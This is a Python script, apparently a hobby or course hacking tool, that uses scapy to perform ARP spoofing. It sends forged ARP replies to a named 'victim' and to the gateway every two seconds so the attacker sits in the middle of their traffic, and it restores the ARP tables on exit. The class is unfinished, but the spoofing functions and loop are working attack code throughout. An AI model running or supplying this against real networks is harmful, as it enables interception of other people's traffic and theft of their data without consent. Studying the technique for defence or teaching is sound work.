"""arp_spoofer.py - ARP spoofer that performs a man-in-the-middle attack through disguise between chosen two devices."""

import time
from threading import Thread
import scapy.all as scapy


class ARPSpoofer:
    """Manage ARP spoofing asynchronously between two selected devices on the network.

    Attributes:
        target_ip (str) - IP address of the targeted device ("victim")
        gateway_ip (str) - IP address of the default gateway in the network
        running (bool) - whether spoofing_thread is currently running or not
        spoofing_thread (Thread) - thread responsible for performing spoofing itself

    Methods:
        start_spoofing() -
        stop_spoofing() -
    """

    def __init__(self, target_ip: str, gateway_ip: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = True
        # TODO: Finish target later.
        # self.spoofing_thread = Thread(target=perform_spoofing, args=(target_ip, gateway_ip), daemon=True)


def get_mac(ip: str) -> str:
    """Get MAC address of the device in the network that has provided IP address by sending ARP request."""
    # TODO: Fix this ARP highlight thing in scapy.
    # https://stackoverflow.com/questions/63645535/arp-in-scapy-not-working-and-getting-an-error-cannot-find-reference-arp-in-a
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_frame / arp_request
    answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
    try:
        return answered[0][1].hwsrc
    except IndexError:
        print(f"[-] Error. Could not get a response over the network. "
              f"The IP address might be invalid or there is a problem with your connection. "
              f"The program has been stopped.")
        exit()


def spoof(target_ip: str, gateway_ip: str) -> None:
    """Spoof connection between two devices, becoming a man-in-the-middle."""
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=gateway_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip: str, source_ip: str) -> None:
    """Restore connection between two devices to its original flow."""
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                       psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)


def get_default_gateway(target_ip: str) -> str:
    """Take target's IP address and return the default gateway's IP address based on that (naive approach)."""
    # TODO: Get default gateway by using commands and regex?
    address = target_ip.split(".")
    address[3] = "1"
    gateway_ip = ".".join(address)
    print(f"[-] Gateway address was not specified. Using default address ({gateway_ip})")
    return gateway_ip


# TODO: Implement into class.
def start_spoofing(target_ip: str, gateway_ip: str) -> None:
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            # NOTE: Remember that while working on threads, the console output won't be displayed unless in debug mode.
            print(f"[+] Sending 2 packets regularly... Total packets sent: {sent_packets_count}", end="\r")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Execution aborted. Restoring ARP tables...")
        stop_spoofing(target_ip, gateway_ip)


def stop_spoofing(target_ip: str, gateway_ip: str) -> None:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
